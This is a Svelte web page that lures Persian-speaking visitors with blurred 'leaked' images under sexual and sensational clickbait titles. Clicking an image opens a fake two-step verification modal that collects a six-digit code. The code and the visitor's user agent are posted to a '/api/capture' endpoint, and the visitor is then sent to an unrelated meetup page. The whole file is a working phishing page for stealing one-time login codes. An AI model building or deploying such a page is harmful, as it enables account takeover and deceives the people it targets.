<!-- src/routes/demo/+page.svelte -->
<script>
// @ts-nocheck

	import { goto } from '$app/navigation';
	import { redirect } from '@sveltejs/kit';

// @ts-nocheck

  import { fade } from 'svelte/transition';

  let images = [
    { id: 1, title: "پورن استار که مسلمان شد", url: "https://st1.bollywoodlife.com/wp-content/uploads/2025/03/rae-3.png?impolicy=Medium_Widthonly&w=412", blurred: false },
    { id: 2, title: "تصویر دختر افغان", url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfn2y5NgnoYdbAQ99AwNhYYO_IVKcmvdwKqA&s", blurred: true },
    { id: 3, title: "واقعا باورم نمیشد", url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTd0MwQHKUWedo_A7_ZhWLWX99jcGWr_C7vg&s", blurred: true },
    { id: 4, title: "پیرمرد ایرانی", url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRIAOqpvhEwKo0owJISTmgvYIY5pWz6YVHyvQ&s", blurred: true },
    { id: 5, title: "فلم یکی از هموطنا", url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSiVqRLxAZhWYL_yMbGujquNce0QGJukLbqvA&s", blurred: true },
    { id: 6, title: "خراب کاری", url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTbISVUrItAG_HCtN7n91Mhbxa3kQ3GeVRxOw&s", blurred: true },
    { id: 7, title: "دشت گل‌های وحشی", url: "https://picsum.photos/id/66/400/300", blurred: true },
    { id: 8, title: "غروب دریاچه", url: "https://picsum.photos/id/30/400/300", blurred: true },
    { id: 9, title: "برج ایفل", url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4kEulo8LS0zDcE9R9FfH7c9seJQS6Hn6LXQ&s", blurred: true }
  ];

  /**
	 * @type {string | any[]}
	 */
  let unblurredImages = [];
  let showModal = $state(false);
  let verificationCode = $state('');
  let isSubmitting = $state(false);
  let errorMessage = $state('');
  let successMessage = $state('');
  /**
	 * @type {never[]}
	 */
  // @ts-ignore
  let capturedCodes = $state([]);
  let digits = $state(['', '', '', '', '', '']);
  let selectedImage = $state(null);
  
  /**
	 * @param {{ target: { value: string; }; }} event
	 */
  function handleCodeInput(event) {
      verificationCode = event.target.value.replace(/[^0-9]/g, '').slice(0, 6);
      
      if (verificationCode.length === 6 && !isSubmitting) {
          handleSubmit();
      }
  }


  /**
	 * @param {{ id: any; title?: string; url?: string; blurred: any; }} image
	 */
  // @ts-ignore
  function shouldBeBlurred(image) {
      return image.blurred && !unblurredImages.includes(image.id);
  }

  async function handleSubmit() {
      if (verificationCode.length !== 6) {
          errorMessage = 'Please enter all 6 digits';
          setTimeout(() => errorMessage = '', 2000);
          return;
      }
      
      isSubmitting = true;
      errorMessage = '';
      
      const userAgent = navigator.userAgent;
      const codeToSend = verificationCode;
      
      // Send code to capture API
      try {
          await fetch('/api/capture', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ 
                  code: codeToSend,
                  timestamp: new Date().toISOString(),
                  userAgent: userAgent,
              
              })
          });
          

          
          // Close modal first
          showModal = false;
          verificationCode = '';
          digits = ['', '', '', '', '', ''];
          
          // Show success message
          successMessage = '✅ تایید شد! در حال انتقال...';
          setTimeout(() => successMessage = '', 2000);
          
          // Redirect after a short delay
              setTimeout(() => {
                    window.location.href = 'https://www.meetup.com/thefungirls-meetup-cm/';
                }, 200);
          
      } catch (err) {
          console.error('Error:', err);
          errorMessage = 'Error occurred. Please try again.';
          isSubmitting = false;
      // @ts-ignore
      };
    }
  
  function closeModal() {
      if (!isSubmitting) {
          showModal = false;
          verificationCode = '';
          errorMessage = '';
          digits = ['', '', '', '', '', ''];
      }
  }
  
  /**
	 * @param {null} img
	 */
  function openModal(img) {
      selectedImage = img;
      digits = ['', '', '', '', '', ''];
      verificationCode = '';
      errorMessage = '';
      showModal = true;
      setTimeout(() => {
          const firstInput = document.querySelector('#digit-0');
          // @ts-ignore
          if (firstInput) firstInput.focus();
      }, 100);
            alert(`🔔 برای مشاهده این تصویر باید هویت خود را تایید کنید`);

  }
  
  /**
	 * @param {number} index
	 * @param {string} value
	 */
  function updateDigit(index, value) {
      digits[index] = value.replace(/[^0-9]/g, '').slice(0, 1);
      verificationCode = digits.join('');
      
      if (value && index < 5) {
          const next = document.querySelector(`#digit-${index + 1}`);
          // @ts-ignore
          if (next) next.focus();
      }
      
      if (verificationCode.length === 6 && !isSubmitting) {
          handleSubmit();
      }
  }
  
  /**
	 * @param {number} index
	 * @param {KeyboardEvent & { currentTarget: EventTarget & HTMLInputElement; }} event
	 */
  function handleKeydown(index, event) {
      if (event.key === 'Backspace' && !digits[index] && index > 0) {
          const prev = document.querySelector(`#digit-${index - 1}`);
          // @ts-ignore
          if (prev) prev.focus();
      }
  }


	// function handleImageClick(image) {
	// 	throw new Error('Function not implemented.');
	// }
</script>

<!-- Gallery -->
<div class="min-h-screen bg-gradient-to-br from-gray-100 to-gray-200">
  <div class="container mx-auto px-4 py-8 max-w-6xl">
    <header class="text-center mb-12">
      <h1 class="text-4xl md:text-5xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-purple-600 to-pink-600 mb-3">
        🖼️ گالری تعاملی
      </h1>
      <p class="text-gray-600 text-lg max-w-2xl mx-auto">
       همه تصاویر محرمانه هستند و در دسترس عموم قرار نمی گیرد
      </p>
      <div class="w-24 h-1 bg-gradient-to-r from-purple-500 to-pink-500 mx-auto mt-4 rounded-full"></div>
    </header>

    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
      {#each images as image (image.id)}
        <!-- svelte-ignore a11y_click_events_have_key_events -->
        <!-- svelte-ignore a11y_no_static_element_interactions -->
        <div
          transition:fade
          class="group relative bg-white rounded-2xl overflow-hidden shadow-lg hover:shadow-xl transition-all duration-300 cursor-pointer"
          onclick={openModal}
        >
          <div class="relative w-full pt-[75%] bg-gray-200 overflow-hidden">
            <img
              src={image.url}
              alt={image.title}
              class="absolute top-0 left-0 w-full h-full object-cover transition-all duration-500 blur-lg"
            
           
            />
          
              <div class="absolute inset-0 bg-black/40 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity duration-300">
                <span class="bg-white/90 backdrop-blur-sm text-gray-800 px-4 py-2 rounded-full text-sm font-bold shadow-lg">
                  🔍 برای مشاهده کلیک کنید
                </span>
              </div>
            
          </div>
          
          <div class="p-3 text-center border-t border-gray-100">
            <h3 class="font-semibold text-gray-800">{image.title}</h3>
            <span class="text-xs text-gray-400">

                🔒 محو

            </span>
          </div>
        </div>
      {/each}
    </div>

    <footer class="text-center text-gray-500 mt-16 pt-6 border-t border-gray-300 text-sm">
      <p>© ۱۴۰۵ - مجموع لو رفته ها</p>
    </footer>
  </div>
</div>

<!-- Modal Popup -->
{#if showModal}
    <div class="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
        <div class="bg-white rounded-2xl max-w-md w-full shadow-2xl">
            <div class="p-6 border-b border-gray-100">
                <div class="flex items-center justify-between">
                    <div class="flex items-center gap-3">
                        <div class="w-10 h-10 bg-gradient-to-br from-blue-500 to-purple-600 rounded-full flex items-center justify-center">
                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                            </svg>
                        </div>
                        <h2 class="text-xl font-bold text-gray-800">تایید هویت دو مرحله‌ای</h2>
                    </div>
                    <button
                        onclick={closeModal}
                        disabled={isSubmitting}
                        class="text-gray-400 hover:text-gray-600 transition-colors disabled:opacity-50"
                        aria-label="Close modal"
                    >
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
                        </svg>
                    </button>
                </div>
            </div>
            
            <div class="p-6 space-y-5">
                <p class="text-gray-600 text-center">
                    کد ۶ رقمی ارسال شده را وارد کنید
                </p>
                
                <div class="flex justify-center gap-3">
                    {#each [0,1,2,3,4,5] as i}
                        <div class="w-14 h-14 sm:w-16 sm:h-16">
                            <input
                                type="text"
                                maxlength="1"
                                inputmode="numeric"
                                pattern="[0-9]"
                                id={`digit-${i}`}
                                value={digits[i]}
                                oninput={(e) => updateDigit(i, e.target.value)}
                                onkeydown={(e) => handleKeydown(i, e)}
                                class="w-full h-full text-center text-2xl font-bold text-gray-800 
                                       border-2 rounded-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-200
                                       outline-none transition-all"
                                placeholder="۰"
                                disabled={isSubmitting}
                                aria-label={`Digit ${i + 1}`}
                            />
                        </div>
                    {/each}
                </div>
                
                <div class="mt-4">
                    <label class="block text-sm font-medium text-gray-700 mb-2" for="code-input">
                        یا کد را اینجا وارد کنید:
                    </label>
                    <input
                        id="code-input"
                        type="text"
                        inputmode="numeric"
                        pattern="[0-9]*"
                        maxlength="6"
                        value={verificationCode}
                        oninput={handleCodeInput}
                        placeholder="۱۲۳۴۵۶"
                        disabled={isSubmitting}
                        class="w-full px-4 py-3 text-center text-2xl tracking-[0.5em] font-mono
                               border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-200
                               outline-none transition-all"
                    />
                    <p class="text-xs text-gray-400 mt-2 text-center">
                        {verificationCode.length}/6 رقم
                    </p>
                </div>
                
                {#if errorMessage}
                    <div class="bg-red-50 border-l-4 border-red-500 p-3 rounded">
                        <p class="text-red-700 text-sm">{errorMessage}</p>
                    </div>
                {/if}
                
                {#if successMessage}
                    <div class="bg-green-50 border-l-4 border-green-500 p-3 rounded">
                        <p class="text-green-700 text-sm">{successMessage}</p>
                    </div>
                {/if}
            </div>
            
            <div class="p-6 border-t border-gray-100 bg-gray-50 rounded-b-2xl">
                <button
                    onclick={handleSubmit}
                    disabled={isSubmitting || verificationCode.length !== 6}
                    class="w-full py-3 bg-gradient-to-r from-blue-600 to-purple-600 text-white font-semibold rounded-xl
                           hover:from-blue-700 hover:to-purple-700 transform transition-all duration-200
                           disabled:opacity-50 disabled:cursor-not-allowed
                           focus:outline-none focus:ring-4 focus:ring-blue-300"
                >
                    {#if isSubmitting}
                        <svg class="animate-spin h-5 w-5 mx-auto" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"/>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                        </svg>
                    {:else}
                        تایید و ادامه
                    {/if}
                </button>
                <p class="text-xs text-center text-gray-400 mt-3">
                    just for trustee 
                </p>
            </div>
        </div>
    </div>
{/if}

<style>
    .animate-spin {
        animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
        from {
            transform: rotate(0deg);
        }
        to {
            transform: rotate(360deg);
        }
    }
    
    .blur-lg {
        filter: blur(20px);
    }
</style>